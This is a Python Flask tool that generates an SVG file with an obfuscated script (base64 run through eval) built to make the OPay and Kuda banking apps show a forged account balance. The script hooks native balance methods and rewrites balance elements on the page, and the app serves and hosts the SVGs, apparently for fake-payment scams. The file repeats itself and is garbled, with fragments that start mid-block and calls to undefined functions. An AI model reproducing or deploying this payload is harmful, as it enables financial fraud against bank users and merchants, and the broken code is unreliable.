from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import uuid
import os
import random
import base64

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Enable CORS
CORS(app)

def generate_demonic_payload(device_id, target_app, target_amount):
    # Platform-specific hooks for Android and iOS
    android_hooks = f"""
    // Android-specific hooks
    try {{
        // WebView detection
        if (navigator.userAgent.includes('Android')) {{
            // Native bridge hooks
            window.NativeBridge = window.NativeBridge || {};
            window.NativeBridge.getAccountBalance = function() {{
                return Promise.resolve({{balance: '{target_amount}'}});
            }};
            
            // Override native methods
            const originalPushState = history.pushState;
            history.pushState = function() {{
                originalPushState.apply(this, arguments);
                setTimeout(() => {{
                    document.querySelectorAll('[data-testid="balance"]').forEach(el => 
                        el.textContent = '{target_amount}'
                    );
                }}, 100);
            }};
        }}
    }} catch (e) {{}}
    """
    
    ios_hooks = f"""
    // iOS-specific hooks
    try {{
        // WKWebView detection
        if (navigator.userAgent.includes('iPhone|iPad|iPod')) {{
            // Safari bridge hooks
            if (window.webkit && window.webkit.messageHandlers) {{
                window.webkit.messageHandlers.getAccountBalance = {{
                    postMessage: function() {{
                        return Promise.resolve({{balance: '{target_amount}'}});
                    }}
                }};
            }}
            
            // Override native methods
            const originalPushState = history.pushState;
            history.pushState = function() {{
                originalPushState.apply(this, arguments);
                setTimeout(() => {{
                    document.querySelectorAll('[data-testid="balance"]').forEach(el => 
                        el.textContent = '{target_amount}'
                    );
                }}, 100);
            }};
        }}
    }} catch (e) {{}}
    """
    
    # App-specific hooks for OPay and Kuda
    opay_hooks = f"""
    // OPay-specific hooks
    try {{
        // Override OPay's balance element
        const opayElements = document.querySelectorAll('[data-testid="opay-balance"]');
        if (opayElements.length > 0) {{
            opayElements[0].textContent = '{target_amount}';
        }}
        
        // Hook into OPay's native methods
        if (window.OPayAPI) {{
            window.OPayAPI.getAccountBalance = function() {{
                return Promise.resolve({{balance: '{target_amount}'}});
            }};
        }}
    }} catch (e) {{}}
    """
    
    kuda_hooks = f"""
    // Kuda-specific hooks
    try {{
        // Override Kuda's balance element
        const kudaElements = document.querySelectorAll('[data-testid="kuda-balance"]');
        if (kudaElements.length > 0) {{
            kudaElements[0].textContent = '{target_amount}';
        }}
        
        // Hook into Kuda's native methods
        if (window.KudaAPI) {{
            window.KudaAPI.getAccountBalance = function() {{
                return Promise.resolve({{balance: '{target_amount}'}});
            }};
        }}
    }} catch (e) {{}}
    """
    
    # Combined payload with all hooks
    js_payload = f"""
    // Platform detection
    const isAndroid = navigator.userAgent.includes('Android');
    const isIOS = navigator.userAgent.includes('iPhone|iPad|iPod');
    
    // Store target app and amount
    const targetApp = '{target_app}';
    const targetAmount = '{target_amount}';
    
    // Hook into storage events
    window.addEventListener('storage', function(e) {{
        if (e.key === 'targetBalance') {{
            document.querySelectorAll('[data-testid="balance"]').forEach(el => 
                el.textContent = e.newValue
            );
        }}
    }});
    
    // Execute platform-specific hooks
    if (isAndroid) {{
        {android_hooks}
    }} else if (isIOS) {{
        {ios_hooks}
    }}
    
    // Execute app-specific hooks
    if (targetApp === 'OPay') {{
        {opay_hooks}
    }} else if (targetApp === 'Kuda') {{
        {kuda_hooks}
    }}
    
    // Try deep links first
    try {{
        window.location = 'kuda://balance';
        window.location = 'opay://dashboard?section=balance';
    }} catch (e) {{
        // Fallback to direct DOM manipulation
        document.querySelectorAll('[data-testid="balance"]').forEach(el => 
            el.textContent = '{target_amount}'
        );
    }}
    """
    
    # Encode payload to avoid syntax errors
    encoded_payload = base64.b64encode(js_payload.encode()).decode()
    svg_payload = f"""
    <svg xmlns="http://www.w3.org/2000/svg">
        <script>
            // Execute payload using eval
            (function() {{
                try {{
                    eval(atob('{encoded_payload}'));
                }} catch (e) {{
                    console.log("Eval error:", e);
                }}
            }})();
        </script>
    </svg>
    """
    
    return svg_payload

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    device_id = request.json.get('device_id')
    target_app = request.json.get('target_app')
    target_amount = request.json.get('target_amount')
    
    payload = generate_demonic_payload(device_id, target_app, target_amount)
    delay = random.randint(1000, 5000)
    payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
    payload = payload.replace('), 1000)', f'), {delay})')
    
    return jsonify({'payload': payload})

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    filename = f"{uuid.uuid4()}.svg"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    
    return jsonify({'url': f"{request.url_root}uploads/{filename}"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))                }}, 100);
            }};
        }}
    }} catch (e) {{}}
    """
    
    ios_hooks = f"""
    // iOS-specific hooks
    try {{
        // WKWebView detection
        if (navigator.userAgent.includes('iPhone|iPad|iPod')) {{
            // Safari bridge hooks
            if (window.webkit && window.webkit.messageHandlers) {{
                window.webkit.messageHandlers.getAccountBalance = {{
                    postMessage: function() {{
                        return Promise.resolve({{balance: '{target_amount}'}});
                    }}
                }};
            }}
            
            // Override native methods
            const originalPushState = history.pushState;
            history.pushState = function() {{
                originalPushState.apply(this, arguments);
                setTimeout(() => {{
                    document.querySelectorAll('[data-testid="balance"]').forEach(el => 
                        el.textContent = '{target_amount}'
                    );
                }}, 100);
            }};
        }}
    }} catch (e) {{}}
    """
    
    # App-specific hooks for OPay and Kuda
    opay_hooks = f"""
    // OPay-specific hooks
    try {{
        // Override OPay's balance element
        const opayElements = document.querySelectorAll('[data-testid="opay-balance"]');
        if (opayElements.length > 0) {{
            opayElements[0].textContent = '{target_amount}';
        }}
        
        // Hook into OPay's native methods
        if (window.OPayAPI) {{
            window.OPayAPI.getAccountBalance = function() {{
                return Promise.resolve({{balance: '{target_amount}'}});
            }};
        }}
    }} catch (e) {{}}
    """
    
    kuda_hooks = f"""
    // Kuda-specific hooks
    try {{
        // Override Kuda's balance element
        const kudaElements = document.querySelectorAll('[data-testid="kuda-balance"]');
        if (kudaElements.length > 0) {{
            kudaElements[0].textContent = '{target_amount}';
        }}
        
        // Hook into Kuda's native methods
        if (window.KudaAPI) {{
            window.KudaAPI.getAccountBalance = function() {{
                return Promise.resolve({{balance: '{target_amount}'}});
            }};
        }}
    }} catch (e) {{}}
    """
    
    # Combined payload with all hooks
    js_payload = f"""
    // Platform detection
    const isAndroid = navigator.userAgent.includes('Android');
    const isIOS = navigator.userAgent.includes('iPhone|iPad|iPod');
    
    // Store target app and amount
    const targetApp = '{target_app}';
    const targetAmount = '{target_amount}';
    
    // Hook into storage events
    window.addEventListener('storage', function(e) {{
        if (e.key === 'targetBalance') {{
            document.querySelectorAll('[data-testid="balance"]').forEach(el => 
                el.textContent = e.newValue
            );
        }}
    }});
    
    // Execute platform-specific hooks
    if (isAndroid) {{
        {android_hooks}
    }} else if (isIOS) {{
        {ios_hooks}
    }}
    
    // Execute app-specific hooks
    if (targetApp === 'OPay') {{
        {opay_hooks}
    }} else if (targetApp === 'Kuda') {{
        {kuda_hooks}
    }}
    
    // Try deep links first
    try {{
        window.location = 'kuda://balance';
        window.location = 'opay://dashboard?section=balance';
    }} catch (e) {{
        // Fallback to direct DOM manipulation
        document.querySelectorAll('[data-testid="balance"]').forEach(el => 
            el.textContent = '{target_amount}'
        );
    }}
    """
    
    # Encode payload to avoid syntax errors
    encoded_payload = base64.b64encode(js_payload.encode()).decode()
    svg_payload = f"""
    <svg xmlns="http://www.w3.org/2000/svg">
        <script>
            // Execute payload using eval
            (function() {{
                try {{
                    eval(atob('{encoded_payload}'));
                }} catch (e) {{
                    console.log("Eval error:", e);
                }}
            }})();
        </script>
    </svg>
    """
    
    return svg_payload

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    device_id = request.json.get('device_id')
    target_app = request.json.get('target_app')
    target_amount = request.json.get('target_amount')
    
    payload = generate_demonic_payload(device_id, target_app, target_amount)
    delay = random.randint(1000, 5000)
    payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
    payload = payload.replace('), 1000)', f'), {delay})')
    
    return jsonify({'payload': payload})

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    filename = f"{uuid.uuid4()}.svg"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    
    return jsonify({'url': f"{request.url_root}uploads/{filename}"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))    try {{
        // Override Kuda's balance element
        const kudaElements = document.querySelectorAll('[data-testid="kuda-balance"]');
        if (kudaElements.length > 0) {{
            kudaElements[0].textContent = '{target_amount}';
        }}
        
        // Hook into Kuda's native methods
        if (window.KudaAPI) {{
            window.KudaAPI.getAccountBalance = function() {{
                return Promise.resolve({{balance: '{target_amount}'}});
            }};
        }}
    }} catch (e) {{}}
    """
    
    # Combined payload
    js_payload = f"""
    // Target app selection
    const targetApp = '{target_app}';
    const targetAmount = '{target_amount}';
    
    // Execute app-specific hooks
    if (targetApp === 'OPay') {{
        {opay_payload}
    }} else if (targetApp === 'Kuda') {{
        {kuda_payload}
    }}
    
    // Common fallbacks
    try {{
        // Simple DOM manipulation
        const elements = document.querySelectorAll('[data-testid="balance"]');
        if (elements.length > 0) {{
            elements[0].textContent = targetAmount;
        }}
        
        // Deep link fallback
        setTimeout(function() {{
            try {{
                window.location = 'kuda://balance';
                window.location = 'opay://dashboard?section=balance';
            }} catch (e) {{
                // Last resort
                localStorage.setItem('targetBalance', targetAmount);
            }}
        }}, 500);
    }} catch (e) {{
        console.log("Error:", e);
    }}
    """
    
    # Encode payload to avoid syntax errors
    encoded_payload = base64.b64encode(js_payload.encode()).decode()
    svg_payload = f"""
    <svg xmlns="http://www.w3.org/2000/svg">
        <script>
            // Execute payload using eval
            (function() {{
                try {{
                    eval(atob('{encoded_payload}'));
                }} catch (e) {{
                    console.log("Eval error:", e);
                }}
            }})();
        </script>
    </svg>
    """
    
    return svg_payload

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    device_id = request.json.get('device_id')
    target_app = request.json.get('target_app')
    target_amount = request.json.get('target_amount')
    
    payload = generate_robust_payload(device_id, target_app, target_amount)
    delay = random.randint(1000, 5000)
    payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
    payload = payload.replace('), 1000)', f'), {delay})')
    
    return jsonify({'payload': payload})

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    filename = f"{uuid.uuid4()}.svg"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    
    return jsonify({'url': f"{request.url_root}uploads/{filename}"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
